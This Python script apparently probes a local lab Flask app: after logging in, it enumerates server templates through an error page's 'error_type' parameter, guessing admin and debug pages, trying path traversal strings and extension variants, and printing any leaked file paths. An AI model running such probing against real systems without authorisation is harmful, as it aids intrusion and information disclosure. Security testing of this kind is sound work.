import requests
import json
from urllib.parse import urlencode

# Target configuration
BASE_URL = "http://127.0.0.1:5000"
LOGIN_URL = f"{BASE_URL}/login"
ERROR_URL = f"{BASE_URL}/error"

# Authentication credentials
USERNAME = "<dummy_username>"
PASSWORD = "<dummy_password>"

print("[*] Starting Template Mapping Script")
print("=" * 80)

# Step 1: Authenticate and capture session
print("\n[STEP 1] Authenticating with credentials")
print("-" * 80)

session = requests.Session()
login_data = {
    "username": USERNAME,
    "password": PASSWORD
}

try:
    login_response = session.post(LOGIN_URL, data=login_data, allow_redirects=False)
    print(f"[+] Login POST {LOGIN_URL}")
    print(f"[+] Status: {login_response.status_code}")
    print(f"[+] Cookies: {dict(session.cookies)}")
    
    if login_response.status_code in [200, 302]:
        print("[+] Authentication successful")
    else:
        print(f"[-] Authentication failed with status {login_response.status_code}")
        print(f"[+] Response: {login_response.text[:500]}")
except Exception as e:
    print(f"[-] Login error: {e}")

# Step 2: Define template test lists
print("\n[STEP 2] Defining Template Test Lists")
print("-" * 80)

common_templates = [
    "index.html",
    "base.html", 
    "error.html",
    "404.html",
    "500.html",
    "home.html",
    "login.html",
    "profile.html",
    "not_found.html"
]

discovered_templates = [
    "login.html",
    "home.html",
    "profile.html",
    "loan_details.html",
    "not_implemented.html"
]

admin_debug_templates = [
    "admin.html",
    "debug.html",
    "test.html",
    "config.html",
    "dashboard.html",
    "settings.html"
]

# Combine all unique templates
all_templates = list(set(common_templates + discovered_templates + admin_debug_templates))
print(f"[+] Testing {len(all_templates)} unique template names")

# Step 3: Test each template
print("\n[STEP 3] Testing Template Names")
print("-" * 80)

results = {
    "existing": [],
    "not_found": [],
    "errors": [],
    "anomalies": []
}

for template in sorted(all_templates):
    params = {
        "error_type": template,
        "error_message": "test"
    }
    
    try:
        response = session.get(ERROR_URL, params=params)
        status = response.status_code
        length = len(response.content)
        
        # Analyze response
        response_lower = response.text.lower()
        
        # Check for template not found indicators
        not_found_indicators = [
            "templatenotfound",
            "template not found",
            "jinja2.exceptions.templatenotfound",
            "does not exist",
            "no such file"
        ]
        
        is_not_found = any(indicator in response_lower for indicator in not_found_indicators)
        
        # Check for successful render indicators
        success_indicators = [
            "<!doctype html>",
            "<html",
            "<title>"
        ]
        
        is_rendered = any(indicator in response_lower for indicator in success_indicators)
        
        # Categorize result
        if is_not_found:
            results["not_found"].append(template)
            print(f"[-] {template:30s} | Status: {status} | Length: {length:6d}B | NOT FOUND")
        elif is_rendered and status == 200:
            results["existing"].append(template)
            print(f"[+] {template:30s} | Status: {status} | Length: {length:6d}B | EXISTS (Rendered)")
            # Print snippet of rendered content
            print(f"    Preview: {response.text[:150].strip()}")
        elif status == 500:
            results["errors"].append(template)
            print(f"[!] {template:30s} | Status: {status} | Length: {length:6d}B | SERVER ERROR")
            # Check for path information in error
            if "templates/" in response.text or ".html" in response.text:
                print(f"    Error contains path info: {response.text[:300]}")
        else:
            results["anomalies"].append(template)
            print(f"[?] {template:30s} | Status: {status} | Length: {length:6d}B | ANOMALY")
            
    except Exception as e:
        print(f"[!] {template:30s} | ERROR: {e}")
        results["errors"].append(template)

# Step 4: Test path traversal patterns
print("\n[STEP 4] Testing Path Traversal Patterns")
print("-" * 80)

path_patterns = [
    "../templates/not_implemented.html",
    "../../not_implemented.html",
    "templates/not_implemented.html",
    "./not_implemented.html",
    "../not_implemented.html",
    "../../templates/not_implemented.html",
    "/templates/not_implemented.html",
    "//not_implemented.html"
]

for pattern in path_patterns:
    params = {
        "error_type": pattern,
        "error_message": "path_test"
    }
    
    try:
        response = session.get(ERROR_URL, params=params)
        status = response.status_code
        length = len(response.content)
        
        response_lower = response.text.lower()
        is_rendered = "<!doctype html>" in response_lower or "<html" in response_lower
        
        if is_rendered and status == 200:
            print(f"[+] {pattern:45s} | Status: {status} | Length: {length:6d}B | RENDERED")
        elif status == 500:
            print(f"[!] {pattern:45s} | Status: {status} | Length: {length:6d}B | ERROR")
            # Look for path disclosure
            if "templates/" in response.text or "File" in response.text:
                error_snippet = response.text[:500]
                print(f"    Path disclosure: {error_snippet}")
        else:
            print(f"[-] {pattern:45s} | Status: {status} | Length: {length:6d}B | Not found")
            
    except Exception as e:
        print(f"[!] {pattern:45s} | ERROR: {e}")

# Step 5: Test extension variations
print("\n[STEP 5] Testing Extension Variations")
print("-" * 80)

base_names = ["not_implemented", "login", "home", "profile"]
extensions = ["", ".jinja2", ".j2", ".html", ".txt"]

for base in base_names:
    for ext in extensions:
        template = f"{base}{ext}"
        params = {
            "error_type": template,
            "error_message": "ext_test"
        }
        
        try:
            response = session.get(ERROR_URL, params=params)
            status = response.status_code
            length = len(response.content)
            
            response_lower = response.text.lower()
            is_rendered = "<!doctype html>" in response_lower or "<html" in response_lower
            
            if is_rendered and status == 200:
                print(f"[+] {template:35s} | Status: {status} | Length: {length:6d}B | RENDERED")
            elif status != 200:
                print(f"[-] {template:35s} | Status: {status} | Length: {length:6d}B")
                
        except Exception as e:
            print(f"[!] {template:35s} | ERROR: {e}")

# Step 6: Generate comprehensive report
print("\n" + "=" * 80)
print("[STEP 6] COMPREHENSIVE TEMPLATE MAPPING REPORT")
print("=" * 80)

print(f"\n[+] EXISTING TEMPLATES (Successfully Rendered): {len(results['existing'])}")
for template in sorted(results['existing']):
    print(f"    ✓ {template}")

print(f"\n[-] NON-EXISTENT TEMPLATES: {len(results['not_found'])}")
for template in sorted(results['not_found'])[:10]:  # Show first 10
    print(f"    ✗ {template}")
if len(results['not_found']) > 10:
    print(f"    ... and {len(results['not_found']) - 10} more")

print(f"\n[!] TEMPLATES CAUSING ERRORS: {len(results['errors'])}")
for template in sorted(results['errors']):
    print(f"    ! {template}")

print(f"\n[?] ANOMALIES: {len(results['anomalies'])}")
for template in sorted(results['anomalies']):
    print(f"    ? {template}")

# Test special case: not_implemented.html with detailed analysis
print("\n" + "=" * 80)
print("[DETAILED ANALYSIS] not_implemented.html Template")
print("=" * 80)

params = {
    "error_type": "not_implemented.html",
    "error_message": "detailed_test"
}

response = session.get(ERROR_URL, params=params)
print(f"[+] URL: {ERROR_URL}?{urlencode(params)}")
print(f"[+] Status: {response.status_code}")
print(f"[+] Content-Length: {len(response.content)}B")
print(f"[+] Content-Type: {response.headers.get('Content-Type', 'N/A')}")
print(f"\n[+] Full Response:")
print(response.text)

print("\n" + "=" * 80)
print("[*] Template Mapping Complete")
print("=" * 80)

